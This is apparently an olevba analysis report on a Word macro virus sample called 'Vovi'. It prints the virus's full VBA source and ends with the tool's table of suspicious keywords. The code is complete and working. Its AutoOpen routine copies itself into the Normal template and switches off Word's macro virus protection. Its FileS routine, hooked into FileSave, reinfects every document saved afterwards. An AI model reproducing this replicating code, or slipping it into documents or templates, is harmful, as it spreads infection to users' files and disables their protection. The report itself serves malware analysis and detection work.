olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Vovi
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Vovi - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO NewMacros.bas 
in file: Virus.MSWord.Vovi - OLE stream: 'Macros/VBA/NewMacros'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()

    On Error GoTo Err
    GoTo Cont
    
Err:
    Exit Sub
    
Cont:
    For Each comp In NormalTemplate.VBProject.VBComponents
'        MsgBox comp.Name
        If comp.Name = "NewMacros" Then
            foundNM = True
            Exit For
        End If
    Next comp
    
    If foundNM = False Then
        NormalTemplate.VBProject.VBComponents.Add (1)
        For Each comp In NormalTemplate.VBProject.VBComponents
'            MsgBox comp.Name
'            MsgBox comp.Type
            If comp.CodeModule.CountOfLines = 0 Then
                If comp.Type = 1 Then
                    comp.Name = "NewMacros"
                    Exit For
                End If
            End If
        Next comp
    End If
    
    If comp.CodeModule.Find("VoviusFirstMacroVirus", _
                1, 1, comp.CodeModule.CountOfLines, 1) = True Then
'        MsgBox "Virus was found"
        Exit Sub
    End If
    
    Options.VirusProtection = False
    If comp.CodeModule.Find("FileSave", _
                1, 1, comp.CodeModule.CountOfLines, 1) = False Then
'        MsgBox "Not Found FileSave. Adding."
        i = comp.CodeModule.CountOfLines
        j = comp.CodeModule.InsertLines(i + 1, "Sub FileSave" _
                + Chr(10) + "End Sub")
 '       i = comp.CodeModule.ProcStartLine("FileSave", vbext_pk_Proc)
'        MsgBox comp.CodeModule.Lines(i, 10)
        fs = 0
    Else
'        MsgBox "Found FileSave"
        fs = 2
    End If
    
 '   MsgBox "Writing FileS To FileSave"
    For Each thiscomp In ActiveDocument.VBProject.VBComponents
 '       MsgBox thiscomp.Name
        If thiscomp.Name = "NewMacros" Then
            Exit For
        End If
    Next thiscomp
    
    i = comp.CodeModule.ProcStartLine("FileSave", vbext_pk_Proc)
    thisi = thiscomp.CodeModule.ProcStartLine("FileS", vbext_pk_Proc)
    thiscount = thiscomp.CodeModule.ProcCountLines("FileS", vbext_pk_Proc)
    j = comp.CodeModule.InsertLines(i + 1, _
                thiscomp.CodeModule.Lines(thisi + 1, thiscount - 2 - fs))
'    MsgBox comp.CodeModule.Lines(i, 10)
        
'    MsgBox "Writing FileS To FileS"
    i = comp.CodeModule.CountOfLines
    thisi = thiscomp.CodeModule.ProcStartLine("FileS", vbext_pk_Proc)
    thiscount = thiscomp.CodeModule.ProcCountLines("FileS", vbext_pk_Proc)
    j = comp.CodeModule.InsertLines(i + 1, _
                thiscomp.CodeModule.Lines(thisi, thiscount))
'    MsgBox comp.CodeModule.Lines(i + 1, 10)
    
'    MsgBox "Adding AutoOp"
    i = comp.CodeModule.CountOfLines
    j = comp.CodeModule.InsertLines(i, "Sub AutoOp" _
                + Chr(10) + "End Sub")
 '   i = comp.CodeModule.ProcStartLine("AutoOp", vbext_pk_Proc)
'    MsgBox comp.CodeModule.Lines(i, 10)
    
'    MsgBox "Writing AutoOpen To AutoOp"
    i = comp.CodeModule.ProcStartLine("AutoOp", vbext_pk_Proc)
    thisi = thiscomp.CodeModule.ProcStartLine("AutoOpen", vbext_pk_Proc)
    thiscount = thiscomp.CodeModule.ProcCountLines("AutoOpen", vbext_pk_Proc)
    j = comp.CodeModule.InsertLines(i + 1, _
                thiscomp.CodeModule.Lines(thisi + 1, thiscount - 2))
'    MsgBox comp.CodeModule.Lines(i, 10)
    
'    MsgBox "Writing label."
    i = comp.CodeModule.CountOfLines
    j = comp.CodeModule.InsertLines(i + 1, "Sub VoviusFirstMacroVirus" _
                    + Chr(10) + Chr(10) + "End Sub")
'    i = comp.CodeModule.ProcStartLine("VoviusFirstMacroVirus", vbext_pk_Proc)
 '   MsgBox comp.CodeModule.Lines(i, 10)
End Sub
Sub FileS()

    On Error GoTo Err
    GoTo Cont
Err:
    Exit Sub
    
Cont:
    For Each comp In ActiveDocument.VBProject.VBComponents
'        MsgBox comp.Name
        If comp.Name = "NewMacros" Then
            foundNM = True
            Exit For
        End If
    Next comp
    
    If foundNM = False Then
        ActiveDocument.VBProject.VBComponents.Add (1)
        For Each comp In ActiveDocument.VBProject.VBComponents
'            MsgBox comp.Name
'            MsgBox comp.Type
            If comp.CodeModule.CountOfLines = 0 Then
                If comp.Type = 1 Then
                    comp.Name = "NewMacros"
                    Exit For
                End If
            End If
        Next comp
    End If
    
    If comp.CodeModule.Find("VoviusFirstMacroVirus", _
                1, 1, comp.CodeModule.CountOfLines, 1) = True Then
'        MsgBox "Virus was found"
        GoTo Done
        Exit Sub
    End If
    
    If comp.CodeModule.Find("AutoOpen", _
                1, 1, comp.CodeModule.CountOfLines, 1) = False Then
'        MsgBox "Not Found AutoOpen. Adding."
        i = comp.CodeModule.CountOfLines
        j = comp.CodeModule.InsertLines(i + 1, "Sub AutoOpen" _
                + Chr(10) + "End Sub")
'        i = comp.CodeModule.ProcStartLine("AutoOpen", vbext_pk_Proc)
'        MsgBox comp.CodeModule.Lines(i, 10)
'    Else
'        MsgBox "Found AutoOpen"
    End If
    
'    MsgBox "Writing AutoOp To AutoOpen"
    For Each thiscomp In NormalTemplate.VBProject.VBComponents
 '       MsgBox thiscomp.Name
        If thiscomp.Name = "NewMacros" Then
            Exit For
        End If
    Next thiscomp
    
    i = comp.CodeModule.ProcStartLine("AutoOpen", vbext_pk_Proc)
    thisi = thiscomp.CodeModule.ProcStartLine("AutoOp", vbext_pk_Proc)
    thiscount = thiscomp.CodeModule.ProcCountLines("AutoOp", vbext_pk_Proc)
    j = comp.CodeModule.InsertLines(i + 1, _
                thiscomp.CodeModule.Lines(thisi + 1, thiscount - 2))
'    MsgBox comp.CodeModule.Lines(i, 10)
    
'    If comp.CodeModule.Find("FileS", _
'                1, 1, comp.CodeModule.CountOfLines, 1) = False Then
    
'    MsgBox "Writing FileS To FileS"
    i = comp.CodeModule.CountOfLines
    thisi = thiscomp.CodeModule.ProcStartLine("FileS", vbext_pk_Proc)
    thiscount = thiscomp.CodeModule.ProcCountLines("FileS", vbext_pk_Proc)
    j = comp.CodeModule.InsertLines(i + 1, _
                thiscomp.CodeModule.Lines(thisi, thiscount))
'    MsgBox comp.CodeModule.Lines(i, 10)
    
'    MsgBox "Writing label."
    i = comp.CodeModule.CountOfLines
    j = comp.CodeModule.InsertLines(i + 1, "Sub VoviusFirstMacroVirus" _
                    + Chr(10) + Chr(10) + "End Sub")
 '   i = comp.CodeModule.ProcStartLine("VoviusFirstMacroVirus", vbext_pk_Proc)
 '   MsgBox comp.CodeModule.Lines(i, 10)
Done:

    ActiveDocument.Save

End Sub

Sub VoviusFirstMacroVirus()

End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

